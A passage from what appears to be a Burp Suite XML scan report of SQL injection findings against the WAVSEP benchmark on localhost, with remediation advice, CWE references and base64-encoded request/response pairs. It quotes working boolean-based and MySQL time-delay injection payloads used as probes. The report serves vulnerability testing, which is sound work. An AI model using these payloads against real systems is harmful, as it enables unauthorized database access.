Q+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3669767371687308288</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>21624070 or 8340=08340</b> and <b>86167776 or 8567=8570</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyMjE2MjQwNzAlMjBvciUyMDgzNDAlM2QwODM0MCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyODYxNjc3NzYlMjBvciUyMDg1NjclM2Q4NTcwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1866916412882295808</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>80427081 or 7421=07421</b> and <b>61740474 or 2874=2876</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9tc2dJZD0xODA0MjcwODElMjBvciUyMDc0MjElM2QwNzQyMSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpSZW1lbWJlciB0byBjaGFuZ2UgeW91ciBwYXNzd29yZAo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9tc2dJZD0xNjE3NDA0NzQlMjBvciUyMDI4NzQlM2QyODc2IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
